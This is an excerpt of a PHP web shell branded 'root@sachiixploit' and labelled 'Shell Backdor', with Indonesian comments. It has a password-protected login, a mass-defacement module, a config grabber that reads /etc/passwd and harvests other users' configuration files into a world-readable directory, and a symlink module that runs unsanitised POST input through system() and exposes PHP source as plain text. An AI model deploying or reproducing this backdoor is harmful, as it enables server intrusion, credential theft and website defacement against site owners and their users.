...
$auth_pass 			= "7bf23feba70a30ed762096c1570bc416";
$color 				= "#00ff00";
...
body {
     color: #fff;
     background-image: url('https://camo.githubusercontent.com/611051fc23131cb16eaf5bd09aed4b73ac1ce2fcc0f49d18d154f3a9620ff3b2/68747470733a2f2f692e696d6775722e636f6d2f51354b534462672e676966');
...
<html>
	<head>
		...
		<meta name="copyright" content="{ root@sachii }"/>
		<title>root@sachii</title>
			...
			<div class="container" style="margin-top: 1%">
				<div class="col-lg-6">
					<div class="form-group">
						<center><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8ebd35be-0f66-459a-ae5b-2f71494cbcbb/dbv2m10-afd48ff8-24fe-4510-aa90-da0c4d390234.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..gkNSMFRQ45is3q2lkz09Wm16TaBsI6yjDPWpXL0iJtY" width="400"></center>
						<h1 class="text-center"><font color="red">root@<font color="white">sachiixploit</h1>
						<h5 class="text-center pb-5"><i class="fa fa-terminal"></i> Shell Backdor</h5>
						<form method="post">
							<input type="password" name="pass" placeholder="Password ID" class="form-control"><br/>
							<button type="submit" class="btn btn-primary btn-block" class="form-control"><i class="fa fa-arrow-right"></i> Masuk</button>
						</form>
					</div>
			</div>
		</center>
...
body {
     ...
     background-repeat: no-repeat;     /* Tambahkan baris berikut */
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://facebook.com/root@sachiiOfficial" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://www.instagram.com/root@sachii.id" class="lain"><i class="fa fa-instagram tambah"></i></a>
					<a href="https://www.youtube.com/root@sachii" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
					<a href="https://github.com/root@sachiiid" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://root@sachii.web.id" class="lain"><i class="fa fa-globe tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/ariffs.yn.3" style="color:#ffffff;"><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8ebd35be-0f66-459a-ae5b-2f71494cbcbb/dbv2m10-afd48ff8-24fe-4510-aa90-da0c4d390234.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..gkNSMFRQ45is3q2lkz09Wm16TaBsI6yjDPWpXL0iJtY" widht="200"><br><i class="fa fa-terminal"></i> <font color="red">root@</font><font color="white">sachiixploit</font></h1>
		...
		if (isset($_GET['about'])) {
			echo '<div class="card text-center bg-light about">
				<h4 class="card-header">{ root@sachii }</h4>
				<div class="card-body">
					<center><img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/8ebd35be-0f66-459a-ae5b-2f71494cbcbb/dbv2m10-afd48ff8-24fe-4510-aa90-da0c4d390234.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..gkNSMFRQ45is3q2lkz09Wm16TaBsI6yjDPWpXL0iJtY" width="300"></div></center>
					<p class="card-text">Hacking no crims</p>
				</div>
	...
	if($_GET['aksi'] == 'masdef') {
		...
		echo "</textarea><br/>";
			...
			echo "<form method='post'>
				...
				<textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hacked By { root@sachii }'></textarea><br/>
	...
	*/
	if($_GET['aksi'] == 'config') {
		...
		$con = mkdir("root@sachii_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("root@sachii_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		while($passwd = fgets($etc)) {
			if($passwd == "" || !$etc) {
					...
					if(is_readable($user_config_dir)) {
						...
						foreach($grab_config as $config => $nama_config) {
							...
							if($ambil_config == '') {
								...
								$file_config = fopen("root@sachii_config/$user_con-$nama_config.txt","w");
		...
		echo "<center><a href='?dir=$path/root@sachii_config'><font color=lime>Done</font></a></center>";
		exit;
	}
	...
	*/
	...
	if ($_GET['aksi'] == 'sym_404'){
		...
		if($_POST['execute']){
			rmdir("root@sachii_sym404");
			mkdir("root@sachii_sym404", 0777);
			$dir = $_POST['dir'];
			$isi = $_POST['isi'];
			system("ln -s ".$dir."root@sachii_sym404/".$isi);
			symlink($dir,"root@sachii_sym404/".$isi);
			$inija = fopen("root@sachii_sym404/.htaccess", "w");
			fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any");
			echo'<a href="/root@sachii_sym404/" target="_blank"> >>Sukses<< </a>';
		}
		exit;
	}
	...
	if ($_GET['aksi'] == 'bypascf') {
		...
		echo '</table></div><hr/><a href="https://facebook.com/root@sachiiOfficial" class="text-muted">Copyright 2019 { root@sachii }</a></center><br/>';	
